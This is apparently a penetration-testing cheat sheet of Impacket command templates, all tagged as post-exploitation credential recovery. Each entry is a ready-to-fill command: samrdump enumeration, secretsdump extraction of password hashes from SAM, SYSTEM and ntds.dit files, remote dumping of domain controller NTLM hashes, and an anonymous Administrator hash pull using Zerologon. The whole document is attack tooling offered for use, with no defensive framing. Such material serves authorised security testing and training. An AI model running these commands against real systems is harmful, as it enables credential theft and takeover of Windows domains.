# Impacket

% impacket, windows, smb, 445

## samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
samrdump.py <domain>/<user>:<password>@<target_ip>
```

## secretsdump
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump '<domain>/<user>:<password>'@<target_ip>
```

## secretsdump local dump - extract hash from sam database
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
```

## secretsdump local dump - extract hash from ntds.dit
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash|00000000000000000000000000000000>:<nthash> LOCAL -outputfile <ntlm-extract-file>
```

## secretsdump - anonymous get administrator 
zerologon
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump <domain>/<dc_bios_name>\$/@<target_ip> -no-pass -just-dc-user "Administrator"
```

## secretsdump - remote extract
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<target_ip>
```

## secretsdump - remote extract + users infos
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<target_ip>
```


